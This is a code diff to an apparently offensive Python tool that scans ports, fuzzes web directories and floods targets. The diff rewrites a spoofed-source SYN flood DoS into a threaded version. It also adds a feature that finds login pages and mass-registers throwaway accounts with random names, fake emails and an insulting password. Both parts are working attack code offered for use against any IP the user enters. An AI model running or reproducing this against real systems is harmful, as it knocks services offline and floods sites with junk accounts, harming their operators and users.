@@ -1,11 +1,13 @@
 from colorama import Fore, init
 import requests
-from sys import stdout
 from scapy.all import *
 import socket
 from random import randint
 import threading
 import time
+import mechanize
+import random
+import string
 
 from scapy.layers.inet import TCP, IP
 
@@ -25,6 +27,9 @@ dirs = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'lo
         'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
         'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
         'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
+
+login_dirs = ['index.html', 'index.php', 'index.htm']
+
 FTP = False
 SSH = False
 Website = False
@@ -41,11 +46,6 @@ print(f'''
     {Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
     ''')
 
-ip = input('            IP: ')
-
-print('')
-print('')
-
 PORTS = {21: 'FTP',
          22: 'SSH',
          23: 'TELNET',
@@ -58,55 +58,39 @@ PORTS = {21: 'FTP',
          25565: 'JavaServer'}
 
 
-def randomIP():
-    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
-    return ip
+def syn_flood(dst_ip: str, dst_port: int):
+    ip_packet = IP()
+    ip_packet.src = ".".join(map(str, [randint(0, 255) for _ in range(4)]))
+    ip_packet.dst = dst_ip
+
+    tcp_packet = TCP()
+    tcp_packet.sport = randint(1000, 9000)
+    tcp_packet.dport = dst_port
+    tcp_packet.flags = "S"
+    tcp_packet.seq = randint(1000, 9000)
+    tcp_packet.window = randint(1000, 9000)
+
+    send(ip_packet / tcp_packet, verbose=0)
 
 
-def randInt():
-    x = randint(1000, 9000)
-    return x
+def ddos_threading():
+    counter = int(input("               How many packets do you want to send: "))
+    dst_ip = input("\n               Target IP: ")
+    dst_port = int(input("               Target Port: "))
+
+    print("               Packets are sending...")
+    for i in range(counter):
+        ddos_thread = threading.Thread(target=syn_flood, args=[dst_ip, dst_port], daemon=True)
+        print(f'               {Fore.LB}[{i}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dst_ip}:{dst_port}{Fore.W}')
+        time.sleep(2)
+        ddos_thread.start()
+    print(f"\n               Total packets sent: {counter}\n")
 
 
-def SYN_Flood(dstIP, dstPort, counter):
-    total = 0
-    print("             Packets are sending...")
+ip = input('            IP: ')
 
-    for x in range(0, counter):
-        s_port = randInt()
-        s_eq = randInt()
-        window = randInt()
-
-        IP_Packet = IP()
-        IP_Packet.src = randomIP()
-        IP_Packet.dst = dstIP
-
-        TCP_Packet = TCP()
-        TCP_Packet.sport = s_port
-        TCP_Packet.dport = dstPort
-        TCP_Packet.flags = "S"
-        TCP_Packet.seq = s_eq
-        TCP_Packet.window = window
-
-        send(IP_Packet / TCP_Packet, verbose=0)
-        print(f'             {Fore.LB}[{total}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dstIP}:{dstPort}{Fore.W}')
-        total += 1
-
-    stdout.write("\n             Total packets sent: %i\n" % total)
-
-
-def info():
-    dstIP = input("\n             Target IP: ")
-    dstPort = input("             Target Port: ")
-
-    return dstIP, int(dstPort)
-
-
-def ddos():
-    dstIP, dstPort = info()
-    counter = input("             How many packets do you want to send: ")
-    SYN_Flood(dstIP, dstPort, int(counter))
-
+print('')
+print('')
 
 for port in PORTS:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -152,25 +136,144 @@ def fuzz(directory):
     if status == 200:
         meaning = '[OK]'
         color = Fore.LIGHTGREEN_EX
+        if directory == 'login/':
+            ask_spam = input(f'             Do you want to find more about "{directory}"? y/n: ')
+            if ask_spam == 'y':
+
+                for dir in login_dirs:
+                    login_fuzz_url = f'http://{ip}/login/{dir}'
+                    login_status = requests.get(str(login_fuzz_url), headers=user_agent).status_code
+
+                    if login_status == 200:
+                        meaning = '[OK]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')
+                        ask_account_creation = input('             Do you want to spam create accounts? y/n: ')
+                        if ask_account_creation == 'y':
+                            account_count = input('             How many accounts to create?: ')
+                            url = login_fuzz_url
+
+                            for _ in range(int(account_count)):
+                                letters = string.ascii_lowercase
+                                username = ''.join(random.choice(letters) for i in range(10))
+                                email = ''.join(random.choice(letters) for i in range(10)).join('@gmail.com')
+                                password = 'Fuck_you_lol!'
+                                br = mechanize.Browser()
+                                br.addheaders = [('User-agent',
+                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]
+                                br.set_handle_robots(False)
+                                br.open(url)
+
+                                br.select_form(nr=0)
+
+                                emailf = br.form.find_control(id="email")
+                                emailf.value = email
+
+                                usernamef = br.form.find_control(id="username")
+                                usernamef.value = username
+
+                                passwordf = br.form.find_control(id="password")
+                                passwordf.value = password
+
+                                confirmPasswordf = br.form.find_control(id="confirmPassword")
+                                confirmPasswordf.value = password
+
+                                br.submit()
+                                time.sleep(1)
+                                nexturl = br.geturl()
+                                print(f'             {Fore.LG}[+]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}')
+
+                    elif login_status == 404:
+                        meaning = '[Not Found]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')
+
+                    else:
+                        meaning = '[Unknown]'
+                        color = Fore.LIGHTYELLOW_EX
+                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')
+
+        elif directory == 'Login/':
+            ask_spam2 = input(f'             Do you want to find more about "{directory}"? y/n: ')
+            if ask_spam2 == 'y':
+
+                for dir in login_dirs:
+                    login_fuzz_url2 = f'http://{ip}/login/{dir}'
+                    login_status2 = requests.get(str(login_fuzz_url2), headers=user_agent).status_code
+
+                    if login_status2 == 200:
+                        meaning = '[OK]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')
+                        ask_account_creation = input('             Do you want to spam create accounts? y/n: ')
+                        if ask_account_creation == 'y':
+                            account_count = input('             How many accounts to create?: ')
+                            url = login_fuzz_url2
+
+                            for _ in range(int(account_count)):
+                                letters = string.ascii_lowercase
+                                username = ''.join(random.choice(letters) for i in range(10))
+                                email = ''.join(random.choice(letters) for i in range(10)).join('@gmail.com')
+                                password = 'Fuck_you_lol!'
+                                br = mechanize.Browser()
+                                br.addheaders = [('User-agent',
+                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]
+                                br.set_handle_robots(False)
+                                br.open(url)
+
+                                br.select_form(nr=0)
+
+                                emailf = br.form.find_control(id="email")
+                                emailf.value = email
+
+                                usernamef = br.form.find_control(id="username")
+                                usernamef.value = username
+
+                                passwordf = br.form.find_control(id="password")
+                                passwordf.value = password
+
+                                confirmPasswordf = br.form.find_control(id="confirmPassword")
+                                confirmPasswordf.value = password
+
+                                br.submit()
+                                time.sleep(1)
+                                nexturl = br.geturl()
+                                print(f'             {Fore.LG}[+]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}')
+
+                    elif login_status2 == 404:
+                        meaning = '[Not Found]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')
+
+                    else:
+                        meaning = '[Unknown]'
+                        color = Fore.LIGHTYELLOW_EX
+                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')
+
     elif status == 403:
         meaning = '[Forbidden]'
         color = Fore.LIGHTRED_EX
+
     elif status == 404:
         meaning = '[Not Found]'
         color = Fore.LIGHTRED_EX
+
     elif status == 429:
         meaning = '[Too Many Requests]'
         color = Fore.LIGHTYELLOW_EX
+
     else:
         meaning = ''
         color = Fore.LIGHTBLUE_EX
     print(f'            {color}[{status}] {meaning} {Fore.W} {fuzz_url}')
 
+    time.sleep(0.1)
+
 
 def threads_handler():
     for directory in dirs:
         fuzz_thread = threading.Thread(target=fuzz, args=(directory,), daemon=True)  # Starts the fuzzing thread
-        time.sleep(2)
+        time.sleep(0.8)
         fuzz_thread.start()
 
 
@@ -226,9 +329,9 @@ if SSH:
         print('''               Ok.
                     ''')
 
-ddos_ask = input('            Do you want to try DDoSing? y/n: ')
+ddos_ask = input('            Do you want to send packets? y/n: ')
 if ddos_ask == 'y':
-    ddos()
+    ddos_threading()
 else:
     print('               Ok.')
     print('')
